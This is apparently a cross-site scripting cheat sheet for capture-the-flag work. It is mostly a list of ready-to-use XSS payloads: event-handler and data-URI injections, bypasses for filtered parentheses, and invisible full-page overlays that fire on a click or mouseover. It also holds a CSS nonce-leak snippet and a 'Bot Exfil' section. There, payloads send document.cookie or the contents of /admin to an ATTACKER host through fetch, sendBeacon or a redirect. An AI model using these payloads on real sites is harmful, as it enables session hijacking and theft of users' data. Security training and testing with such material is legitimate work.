# XSS

## The Basics

1. You can do evals, window.name, tabs, redirect, anything
2. if fetch didnt work, try navigator.sendBeacon or XMLHttpRequest
3. Some browser like firefox usually have unexpected behavior
4. Solve LOCALLY
5. sameSite=Strict? use `window.open`. Most case window.open is powerful

## Javascript

```javascript
//This is a 1 line comment
/* This is a multiline comment*/
#!This is a 1 line comment, but "#!" must to be at the beggining of the line
-->This is a 1 line comment, but "-->" must to be at the beggining of the lin
```

## Payloads

```html
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<iframe srcdoc="<svg onload=alert(1)>"></iframe>
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">

```

## Bot Exfil

```html
<img src=x onerror="fetch('https://ATTACKER/?c='+document.cookie)">
<img src=x onerror="navigator.sendBeacon('https://ATTACKER/',document.cookie)">
<script>location='https://ATTACKER/?c='+encodeURIComponent(document.cookie)</script>
<script>fetch('/admin').then(r=>r.text()).then(x=>fetch('https://ATTACKER/',{method:'POST',body:x}))</script>
```

## Parentheses Filtered

```html
<svg onload=alert`1`>
<img src=x onerror=eval.call`${'alert\x281\x29'}`>
<iframe srcdoc="<script>top['al'+'ert']`1`</script>">
```

## DOM Sources / Sinks

```text
Sources: location, location.hash, location.search, document.URL, document.referrer, window.name, postMessage
Sinks: innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, setTimeout, Function, location=
Search: innerHTML|insertAdjacentHTML|document.write|eval|postMessage|location.hash|window.name
```

## Mutation XSS

[https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss ](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)

## XS Leak (CSS Injection)

usually to leak nonce

[https://waituck.sg/2023/12/11/0ctf-2023-newdiary-writeup.html](https://waituck.sg/2023/12/11/0ctf-2023-newdiary-writeup.html)

```css
input[name="nonce"][value^="a"] { background:
url("HOOK?data=a");display: block !important; }


```

## Style Events Payloads

```html
<div oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>
aaaa
</div>

<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>

```

## CSP Bypass

{% embed url="https://hacktricks.boitatech.com.br/pentesting-web/content-security-policy-csp-bypass" %}

## Resources

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
* [https://tinyxss.terjanq.me/](https://tinyxss.terjanq.me/)
* [https://hacktricks.boitatech.com.br/pentesting-web/xss-cross-site-scripting](https://hacktricks.boitatech.com.br/pentesting-web/xss-cross-site-scripting)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection) [http://www.xss-payloads.com](http://www.xss-payloads.com/)&#x20;
* [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt)
* [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)&#x20;
* [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
* [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)&#x20;
*   [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)

    #### &#x20; <a href="#xss-tools" id="xss-tools"></a>
